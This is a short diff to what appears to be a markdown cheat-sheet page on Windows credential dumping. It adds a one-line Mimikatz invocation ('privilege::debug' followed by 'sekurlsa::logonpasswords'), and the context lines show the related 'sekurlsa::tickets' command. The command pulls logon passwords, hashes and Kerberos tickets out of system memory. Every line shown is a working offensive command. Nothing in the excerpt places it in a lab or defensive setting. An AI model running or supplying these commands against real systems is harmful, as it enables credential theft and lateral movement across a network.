@@ -34,3 +34,10 @@ sekurlsa::logonpasswords
 sekurlsa::tickets
 ```
 
+
+
+{% code overflow="wrap" %}
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+{% endcode %}
